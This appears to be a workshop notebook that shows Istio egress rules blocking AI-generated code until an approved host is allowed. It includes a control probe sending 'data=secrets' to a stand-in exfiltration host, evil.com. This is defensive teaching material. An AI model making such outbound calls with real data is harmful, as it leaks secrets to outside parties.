# Stage 04: Network Data Lost Prevention (DLP)

This stage uses the agent to generate code for a normal external dependency: fetching the public news page at `api.agentcon.local/news` and summarizing it. The same generated code should stay blocked until the namespaced `ServiceEntry` exists, while an explicit `evil.com` control probe remains blocked.


In [ ]:
from __future__ import annotations

import contextlib
import io
import subprocess
import textwrap
from typing import Any
from urllib.error import URLError
from urllib.request import urlopen

from pydantic_ai import Agent
from pydantic_ai.models.openai import OpenAIChatModel
from pydantic_ai.providers.openai import OpenAIProvider

from utils import extract_output

import nest_asyncio

nest_asyncio.apply()


## Ask the agent to write a normal external fetcher

The trainer should delete the shared `istio-system/workshop-open-egress` entry before this stage. The task itself is ordinary: fetch an external news page and print a short summary.


In [ ]:
LITELLM_BASE_URL = 'http://llm-gateway.workshop-system.svc.cluster.local:4000/v1'
LITELLM_MODEL = 'workshop-gemini'
LITELLM_API_KEY = 'not-needed'
NEWS_URL = 'http://api.agentcon.local/news'
EXFILTRATION_URL = 'http://evil.com/exfil'
SERVICE_ENTRY_NAME = 'allow-agentcon-api'

with open('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'r') as f:
    WORKSPACE_NAMESPACE = f.read().strip()

EXTERNAL_NEWS_PROMPT = textwrap.dedent(
    f"""
    Write Python code using only the standard library that fetches the HTML page at {NEWS_URL}.

    Store the fetched HTML in a variable named page_content.
    Store a short readable summary in a variable named summary.
    Print the summary for the user.

    Return only Python code. Do not add Markdown fences.
    """
).strip()

code_generation_agent = Agent(
    OpenAIChatModel(
        LITELLM_MODEL,
        provider=OpenAIProvider(
            base_url=LITELLM_BASE_URL,
            api_key=LITELLM_API_KEY,
        ),
    ),
    system_prompt='You are a helpful Python automation assistant. Return only Python code.',
)

generated_code = extract_output(code_generation_agent.run_sync(EXTERNAL_NEWS_PROMPT))
print(generated_code)


## Run the generated code before the namespaced allow entry


In [ ]:
def run_generated_code(code: str) -> dict[str, Any]:
    exec_env: dict[str, Any] = {}
    stdout = io.StringIO()

    try:
        with contextlib.redirect_stdout(stdout):
            exec(code, exec_env, exec_env)
    except BaseException as exc:
        return {
            'stdout': stdout.getvalue(),
            'error': f'{type(exc).__name__}: {exc}',
            'page_content': exec_env.get('page_content'),
            'summary': exec_env.get('summary'),
        }

    return {
        'stdout': stdout.getvalue(),
        'error': None,
        'page_content': exec_env.get('page_content'),
        'summary': exec_env.get('summary'),
    }

def probe_exfiltration_destination() -> str:
    try:
        urlopen(f'{EXFILTRATION_URL}?data=secrets', timeout=2)
        return 'allowed'
    except URLError as exc:
        return f'blocked: {exc}'
    except Exception as exc:
        return f'failed: {type(exc).__name__}: {exc}'


In [ ]:
run_generated_code(generated_code)


## Apply the namespaced allow entry for the approved host


In [ ]:
ALLOW_AGENTCON_API_SERVICE_ENTRY = textwrap.dedent(
    f"""
    apiVersion: networking.istio.io/v1beta1
    kind: ServiceEntry
    metadata:
      name: {SERVICE_ENTRY_NAME}
    spec:
      hosts:
      - api.agentcon.local
      endpoints:
      - address: workshop-egress.workshop-system.svc.cluster.local
        ports:
          http: 80
      ports:
      - number: 80
        name: http
        protocol: HTTP
      resolution: DNS
      location: MESH_EXTERNAL
    """
).strip()

print(ALLOW_AGENTCON_API_SERVICE_ENTRY)


In [ ]:
apply_result = subprocess.run(
    ['kubectl', 'apply', '-f', '-'],
    input=ALLOW_AGENTCON_API_SERVICE_ENTRY,
    text=True,
    capture_output=True,
    check=True,
)
print(apply_result.stdout or f'{SERVICE_ENTRY_NAME} applied')


In [ ]:
print(
    subprocess.check_output(
        [
            'kubectl',
            'get',
            'serviceentries.networking.istio.io',
            SERVICE_ENTRY_NAME,
            '-n',
            WORKSPACE_NAMESPACE,
            '-o',
            'yaml',
        ],
        text=True,
    )
)


In [ ]:
run_generated_code(generated_code)


## Control check: the exfiltration host should still be blocked


In [ ]:
probe_exfiltration_destination()


## Cleanup the namespaced allow entry


In [ ]:
delete_result = subprocess.run(
    [
        'kubectl',
        'delete',
        'serviceentry',
        SERVICE_ENTRY_NAME,
        '-n',
        WORKSPACE_NAMESPACE,
        '--ignore-not-found=true',
    ],
    text=True,
    capture_output=True,
    check=True,
)
print(delete_result.stdout or f'{SERVICE_ENTRY_NAME} deleted')
